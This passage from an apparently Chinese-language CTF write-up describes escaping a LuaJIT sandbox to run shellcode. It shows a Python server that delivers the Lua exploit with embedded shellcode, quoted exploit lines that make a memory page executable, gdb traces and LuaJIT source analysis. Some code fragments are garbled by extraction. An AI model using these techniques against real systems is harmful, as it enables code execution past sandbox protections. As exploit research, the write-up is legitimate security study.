                #content += "Disallow: /d.txt\r\n"
            elif(self.path == "/a.txt"):
                with open("script.lua", "r") as f:
                    content = f.read()
                    with open('shellcode.hex', 'r') as fs:
                        content = content.format(fs.read())
                self.send_header("Content-Type", "text/x-lua")
            elif(self.path == "/b.txt"):
                content = "hello world b"
                self.send_header("Content-Type", "text/html")
            elif(self.path == "/c.txt"):
                content = "hello world c"
                self.send_header("Content-Type", "text/html")
            elif(self.path == "/d.txt"):
                content = "hello world d"
                self.send_header("Content-Type", "text/html")
            self.close_connection = 0
            self.send_header("Content-Length", str(len(content)))
            self.end_headers()
            self.wfile.write(content)
    def start_server(port):
        http_server = HTTPServer(('localhost', int(port)), TestHTTPHandler)
        http_server.serve_forever()
    start_server(31337)
接下来的分析我们基本就是在lua层完成的了，经过大致的观察，发现虽然这个lua沙箱非常弱，明显存在逃逸可能，这里可以查到[一些资料](http://lua-users.org/wiki/SandBoxes)，对照查看一下函数是否存在，大概是使用这样的函数:
    function fdb0cdf28c53764e()
        return tostring(loadstring)
    end
于是可以通过这样的方法去确认有哪些东西是打开的。非常显然，io是没有的（不然就直接做完了），基本思路也就出来了：需要通过`loadstring`去完成lua的沙箱逃逸，最终执行shellcode去完成利用。
## luajit 沙箱
### 比赛期间的进度
好了，现在我们思路已经基本清晰了，接下来就是去一步一步解决问题。第一步当然是解决luajit沙箱的问题，于是我们搜到了[这篇文章](https://www.corsix.org/content/malicious-luajit-bytecode)，这篇文章甚至给出了exp，nice！
于是我们下载了luajit的源码，由于目标文件是fuchsia系统的，我们调试不是很方便，所以我们下载了luajit的代码在本地编译之后本地调试，打算在调试成功之后再用于目标fuchsia系统。
接下来。。喜闻乐见：
ok，太棒了，现在我们不能直接用他的代码了，得自己去分析一下。。目前的问题看起来是代码是成功写入了，但是无法执行，那应该就是权限问题了。
好了，基本可以明确是权限问题了，那么我们看看权限改变的地方在哪儿。
    -- The following seven lines result in the memory protection of
        -- the page at asaddr changing from read/write to read/execute.
        -- This is done by setting the jit_State::mcarea and szmcarea
        -- fields to specify the page in question, setting the mctop and
        -- mcbot fields to an empty subrange of said page, and then
        -- triggering some JIT compilation. As a somewhat unfortunate
        -- side-effect, the page at asaddr is added to the jit_State's
        -- linked-list of mcode areas (the shellcode unlinks it).
        local mcarea = mctab[1]
        mctab[0] = 0
        mctab[1] = asaddr / 2^52 / 2^1022
        mctab[2] = mctab[1]
        mctab[3] = mctab[1]
        mctab[4] = 2^12 / 2^52 / 2^1022
        while mctab[0] == 0 do end
看来是需要看看具体的情况了。我选择了把循环进行一下更改，这样可以在中间断下来看情况(其实最后segfault看也行，但是当时的情况是我以为在中间更改的步骤出了问题，所以不知道问题出在jit之后还是jit之前):
    -- while mctab[0] == 0 do end
        -- 改为
        local i = 0
        while i , 
      mctop = 0x4321 , 
      mcbot = 0xdead , 
      szmcarea = 0xbeef, 
      szallmcarea = 0x1000,
所以`mctab[0]`对应`mcarea`，然后之后的依次类推。
另外，为了快速找到运行位置，我给mprotect下了断点，然后去运行我们能够运行成功的魔改exp，之后通过backtrace去找到关键位置，过程中出现了多次断点，通过比对参数，涉及到目标页的一共有两次：
    ────────────────────────────────────────────────────────────────────────────────[ trace ]────
    [#0] 0x7ffff7d15790 → Name: mprotect()
    [#1] 0x555555584b30 → Name: mcode_setprot(prot=0x3, sz=, p=)
    [#2] 0x555555584b30 → Name: mcode_protect(J=0x40000558, prot=0x3)
    [#3] 0x555555584dba → Name: mcode_protect(prot=0x3, J=0x40000558)
    [#4] 0x555555584dba → Name: lj_mcode_reserve(J=0x40000558, lim=0x7fffffffdf38)
    [#5] 0x555555597f0b → Name: lj_asm_trace(J=0x40000558, T=0x40000558)
    [#6] 0x55555556c690 → Name: trace_state(L=0x40000378, dummy=, ud=0x40000558)
    [#7] 0x555555575af6 → Name: lj_vm_cpcall()
    [#8] 0x55555556cfeb → Name: lj_trace_ins(J=0x40000558, pc=0x4000ab34)
    [#9] 0x555555560b7f → Name: lj_dispatch_ins(L=0x40000378, pc=0x4000ab38)
    ──────────────────────────────────────────────────────────────────────────────────────────────
    ─────────────────────────────────────────────────────────────────────────────────[ trace ]────
    [#0] 0x7ffff7d15790 → Name: mprotect()
    [#1] 0x555555584b30 → Name: mcode_setprot(prot=0x5, sz=, p=)
    [#2] 0x555555584b30 → Name: mcode_protect(J=0x40000558, prot=0x5)
    [#3] 0x555555584f79 → Name: mcode_protect(prot=0x5, J=0x40000558)
    [#4] 0x555555584f79 → Name: lj_mcode_abort(J=0x40000558)
    [#5] 0x555555584f79 → Name: lj_mcode_limiterr(J=0x40000558, need=0x100)
    [#6] 0x5555555904a5 → Name: asm_mclimit(as=0x7fffffffde30)
    [#7] 0x5555555986bd → Name: asm_exitstub_gen(group=, as=)
    [#8] 0x5555555986bd → Name: asm_exitstub_setup(nexits=, as=0x7fffffffde30)
    [#9] 0x5555555986bd → Name: asm_setup_target(as=0x7fffffffde30)
显然第二次是关键，是真正将页标记为`rx`（prot为5）的。于是根据bt去找到luajit代码的位置，查看需要满足什么条件才能够进入到这一条逻辑：
    /* Abort the reservation. */
    void lj_mcode_abort(jit_State *J)
    {
      if (J->mcarea)
        mcode_protect(J, MCPROT_RUN);
    }
    /* Limit of MCode reservation reached. */
    void lj_mcode_limiterr(jit_State *J, size_t need)
    {
      size_t sizemcode, maxmcode;
      lj_mcode_abort(J);
      sizemcode = (size_t)J->param[JIT_P_sizemcode] param[JIT_P_maxmcode]  sizemcode)
        lj_trace_err(J, LJ_TRERR_MCODEOV);  /* Too long for any area. */
      if (J->szallmcarea + sizemcode > maxmcode)
        lj_trace_err(J, LJ_TRERR_MCODEAL);
      mcode_allocarea(J);
      lj_trace_err(J, LJ_TRERR_MCODELM);  /* Retry with new area. */
    }
对比trace可以发现，其实只有`lj_mcode_limiterr`是在目标页jit
mprotect起作用的时候调用的，中间有一系列`asm_*`函数，大致看了一下应该是执行汇编过程，不太可能在这里切换权限，所以核心点就到了`trace_state`函数，看代码可以发现其实这里主要是根据不同的jit状态去选择执行不同的行为。
还好我们有可以成功触发mprotect的代码，所以我们可以通过对比成功和失败两种情况来找到关键点，我通过成功触发的代码发现在`trace_state`中的执行流程里，成功触发会经过`START
-> RECORD -> END ->
ASM`的过程，而mprotect正是在mprotect中进行调用的（这里保持mprotect的断点，可以在步过的时候快速确认是否运行到了目标位置）。而触发失败的代码没有经过`END
-> ASM`的过程。
看来我们已经基本上确认问题所在了，那么接下来就到了枯燥的看代码时间，需要通过阅读代码去找到为什么没有经过后两个阶段。
这里我更推荐大家自行去阅读代码理清逻辑，看别人总结的代码是没有意义的，看看别人总结的代码大致逻辑之后自己去看才能真正明白。当然为了完整性，我还是把我的过程记录下来。
简要的说，在`RECORD`阶段，会通过`lj_record_ins`去record luajit字节码：
    // lj_trace.c:trace_state 中
    case LJ_TRACE_RECORD:
          trace_pendpatch(J, 0);
          setvmstate(J2G(J), RECORD);
          lj_vmevent_send_(L, RECORD,
        /* Save/restore tmptv state for trace recorder. */
        TValue savetv = J2G(J)->tmptv;
        TValue savetv2 = J2G(J)->tmptv2;
        setintV(L->top++, J->cur.traceno);
        setfuncV(L, L->top++, J->fn);
        setintV(L->top++, J->pt ? (int32_t)proto_bcpos(J->pt, J->pc) : -1);
        setintV(L->top++, J->framedepth);
          ,
        J2G(J)->tmptv = savetv;
        J2G(J)->tmptv2 = savetv2;
          );
          lj_record_ins(J); //  RECORD+ -> END -> (ASM) ->
ERR -> ASM`，最终核心位置在`ASM`里。括号里的ASM是在后来调试中才发现的，第一次并没有发现这个地方。
虽然比较奇怪为什么出现了`ERR`，但是无论如何最终只要能到`ASM`我们就有机会，那么未成功触发的原因：没有进入到`ASM`状态。
相同的方法我也在没成功触发的exp上执行了一遍，发现最终停留在`RECORD`状态，看来是`RECORD`状态一直没有解除。
现在来找找没成功的理由。首先看看我们最后生成的字节码:
    luajit -blg evil.lua evil.out
注意这一条命令需要在`luajit/src/`里执行，需要有`luajit/src/jit`这个extension。（也可以使用其他办法导入，我个人认为这样比较简单罢了）  
否则会报：
    unknown luaJIT command or jit.* modules not installed